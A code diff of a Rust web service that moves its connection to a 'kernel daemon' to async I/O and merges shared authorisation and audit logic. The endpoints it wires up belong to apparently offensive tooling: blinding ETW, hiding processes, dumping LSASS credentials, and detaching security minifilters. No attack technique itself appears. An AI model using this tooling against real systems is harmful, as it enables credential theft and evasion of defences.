@@ -11,9 +11,8 @@ use axum::{
     Json,
 };
 use serde::Deserialize;
-use std::io::{BufRead, BufReader, Write};
-use std::net::TcpStream;
-use std::sync::Mutex;
+use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
+use tokio::net::TcpStream;
 
 use crate::operators;
 
@@ -33,14 +32,14 @@ impl Default for KernelConfig {
 /// Cached TCP connection to the kernel daemon.
 pub struct KernelBridge {
     addr: String,
-    conn: Mutex<Option<TcpStream>>,
+    conn: tokio::sync::Mutex<Option<TcpStream>>,
 }
 
 impl KernelBridge {
     pub fn new(config: KernelConfig) -> Self {
         Self {
             addr: config.addr,
-            conn: Mutex::new(None),
+            conn: tokio::sync::Mutex::new(None),
         }
     }
 
@@ -48,30 +47,32 @@ impl KernelBridge {
         !self.addr.is_empty()
     }
 
-    fn send_op(&self, op: &str, pid: Option<u32>) -> Result<serde_json::Value, String> {
+    async fn send_op(&self, op: &str, pid: Option<u32>) -> Result<serde_json::Value, String> {
         let request = if let Some(p) = pid {
             format!("{{\"op\":\"{op}\",\"pid\":{p}}}\n")
         } else {
             format!("{{\"op\":\"{op}\"}}\n")
         };
 
-        let mut guard = self.conn.lock().map_err(|e| format!("lock: {e}"))?;
+        let mut guard = self.conn.lock().await;
         if guard.is_none() {
-            let s =
-                TcpStream::connect(&self.addr).map_err(|e| format!("daemon {}: {e}", self.addr))?;
-            s.set_read_timeout(Some(std::time::Duration::from_secs(30)))
-                .ok();
+            let s = TcpStream::connect(&self.addr)
+                .await
+                .map_err(|e| format!("daemon {}: {e}", self.addr))?;
             *guard = Some(s);
         }
         let stream = guard.as_mut().unwrap();
         stream
             .write_all(request.as_bytes())
+            .await
             .map_err(|e| format!("write: {e}"))?;
-        stream.flush().map_err(|e| format!("flush: {e}"))?;
 
-        let mut r = BufReader::new(stream.try_clone().map_err(|e| format!("clone: {e}"))?);
+        let mut reader = BufReader::new(&mut *stream);
         let mut line = String::new();
-        r.read_line(&mut line).map_err(|e| format!("read: {e}"))?;
+        reader
+            .read_line(&mut line)
+            .await
+            .map_err(|e| format!("read: {e}"))?;
         if line.is_empty() {
             *guard = None;
             return Err("daemon closed".into());
@@ -109,27 +110,48 @@ pub struct NeutQ {
     pub method: Option<String>,
 }
 
+// ---- Handler dispatch helper ----
+/// Shared kernel dispatch: gate → audit → resolve bridge.
+/// Returns the bridge on success, or an error `Response` to return early.
+async fn kernel_dispatch<'a>(
+    st: &'a std::sync::Arc<crate::AppState>,
+    headers: &HeaderMap,
+    audit_action: &str,
+    audit_details: &str,
+    audit_data: serde_json::Value,
+) -> Result<&'a std::sync::Arc<KernelBridge>, Response> {
+    let op = match gate(st, headers) {
+        Ok(o) => o,
+        Err((code, msg)) => return Err((code, msg).into_response()),
+    };
+    if let Some(audit) = &st.audit {
+        audit.append(audit_action, &op.name, audit_details, audit_data);
+    }
+    match &st.kernel {
+        Some(b) => Ok(b),
+        None => Err(Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response()),
+    }
+}
+
 // ---- Handlers ----
 
 pub async fn driver_status(
     State(st): State<std::sync::Arc<crate::AppState>>,
     headers: HeaderMap,
 ) -> Response {
-    let op = match gate(&st, &headers) {
-        Ok(o) => o,
-        Err((code, msg)) => return (code, msg).into_response(),
+    let bridge = match kernel_dispatch(
+        &st,
+        &headers,
+        "kernel_driver_status",
+        "-",
+        serde_json::json!({}),
+    )
+    .await
+    {
+        Ok(b) => b,
+        Err(r) => return r,
     };
-    if let Some(audit) = &st.audit {
-        audit.append("kernel_driver_status", &op.name, "-", serde_json::json!({}));
-    }
-    let bridge = match &st.kernel {
-        Some(b) => b,
-        None => {
-            return Json(serde_json::json!({"ok":false,"err":"kernel daemon not configured"}))
-                .into_response()
-        }
-    };
-    match bridge.send_op("ping", None) {
+    match bridge.send_op("ping", None).await {
         Ok(_) => Json(serde_json::json!({"ok":true,"status":"connected"})).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"status":"error","err":e})).into_response(),
     }
@@ -139,19 +161,19 @@ pub async fn blind_etw(
     State(st): State<std::sync::Arc<crate::AppState>>,
     headers: HeaderMap,
 ) -> Response {
-    let op = match gate(&st, &headers) {
-        Ok(o) => o,
-        Err((code, msg)) => return (code, msg).into_response(),
+    let bridge = match kernel_dispatch(
+        &st,
+        &headers,
+        "kernel_blind_etw",
+        "-",
+        serde_json::json!({}),
+    )
+    .await
+    {
+        Ok(b) => b,
+        Err(r) => return r,
     };
-    // HIGH-severity privileged action — audit before dispatching to the daemon.
-    if let Some(audit) = &st.audit {
-        audit.append("kernel_blind_etw", &op.name, "-", serde_json::json!({}));
-    }
-    let bridge = match &st.kernel {
-        Some(b) => b,
-        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
-    };
-    match bridge.send_op("blind-etw", None) {
+    match bridge.send_op("blind-etw", None).await {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
     }
@@ -162,23 +184,20 @@ pub async fn hide(
     headers: HeaderMap,
     Query(q): Query<PidQ>,
 ) -> Response {
-    let op = match gate(&st, &headers) {
-        Ok(o) => o,
-        Err((code, msg)) => return (code, msg).into_response(),
+    let details = format!("pid:{}", q.pid);
+    let bridge = match kernel_dispatch(
+        &st,
+        &headers,
+        "kernel_hide",
+        &details,
+        serde_json::json!({}),
+    )
+    .await
+    {
+        Ok(b) => b,
+        Err(r) => return r,
     };
-    if let Some(audit) = &st.audit {
-        audit.append(
-            "kernel_hide",
-            &op.name,
-            &format!("pid:{}", q.pid),
-            serde_json::json!({}),
-        );
-    }
-    let bridge = match &st.kernel {
-        Some(b) => b,
-        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
-    };
-    match bridge.send_op("hide", Some(q.pid)) {
+    match bridge.send_op("hide", Some(q.pid)).await {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
     }
@@ -189,25 +208,20 @@ pub async fn dump_lsass(
     headers: HeaderMap,
     Query(q): Query<PidQ>,
 ) -> Response {
-    let op = match gate(&st, &headers) {
-        Ok(o) => o,
-        Err((code, msg)) => return (code, msg).into_response(),
+    let details = format!("pid:{}", q.pid);
+    let bridge = match kernel_dispatch(
+        &st,
+        &headers,
+        "kernel_dump_lsass",
+        &details,
+        serde_json::json!({}),
+    )
+    .await
+    {
+        Ok(b) => b,
+        Err(r) => return r,
     };
-    // Credential extraction — highest-sensitivity operator action; audit
-    // attribution is mandatory for after-action review.
-    if let Some(audit) = &st.audit {
-        audit.append(
-            "kernel_dump_lsass",
-            &op.name,
-            &format!("pid:{}", q.pid),
-            serde_json::json!({}),
-        );
-    }
-    let bridge = match &st.kernel {
-        Some(b) => b,
-        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
-    };
-    match bridge.send_op("dump-lsass", Some(q.pid)) {
+    match bridge.send_op("dump-lsass", Some(q.pid)).await {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
     }
@@ -218,23 +232,20 @@ pub async fn neutralize(
     headers: HeaderMap,
     Query(q): Query<NeutQ>,
 ) -> Response {
-    let op = match gate(&st, &headers) {
-        Ok(o) => o,
-        Err((code, msg)) => return (code, msg).into_response(),
+    let details = format!("pid:{}", q.pid);
+    let bridge = match kernel_dispatch(
+        &st,
+        &headers,
+        "kernel_neutralize",
+        &details,
+        serde_json::json!({ "method": q.method }),
+    )
+    .await
+    {
+        Ok(b) => b,
+        Err(r) => return r,
     };
-    if let Some(audit) = &st.audit {
-        audit.append(
-            "kernel_neutralize",
-            &op.name,
-            &format!("pid:{}", q.pid),
-            serde_json::json!({ "method": q.method }),
-        );
-    }
-    let bridge = match &st.kernel {
-        Some(b) => b,
-        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
-    };
-    match bridge.send_op("neutralize", Some(q.pid)) {
+    match bridge.send_op("neutralize", Some(q.pid)).await {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
     }
@@ -244,23 +255,19 @@ pub async fn detach_minifilter(
     State(st): State<std::sync::Arc<crate::AppState>>,
     headers: HeaderMap,
 ) -> Response {
-    let op = match gate(&st, &headers) {
-        Ok(o) => o,
-        Err((code, msg)) => return (code, msg).into_response(),
+    let bridge = match kernel_dispatch(
+        &st,
+        &headers,
+        "kernel_detach_minifilter",
+        "-",
+        serde_json::json!({}),
+    )
+    .await
+    {
+        Ok(b) => b,
+        Err(r) => return r,
     };
-    if let Some(audit) = &st.audit {
-        audit.append(
-            "kernel_detach_minifilter",
-            &op.name,
-            "-",
-            serde_json::json!({}),
-        );
-    }
-    let bridge = match &st.kernel {
-        Some(b) => b,
-        None => return Json(serde_json::json!({"ok":false,"err":"no daemon"})).into_response(),
-    };
-    match bridge.send_op("detach-minifilter", None) {
+    match bridge.send_op("detach-minifilter", None).await {
         Ok(v) => Json(v).into_response(),
         Err(e) => Json(serde_json::json!({"ok":false,"err":e})).into_response(),
     }
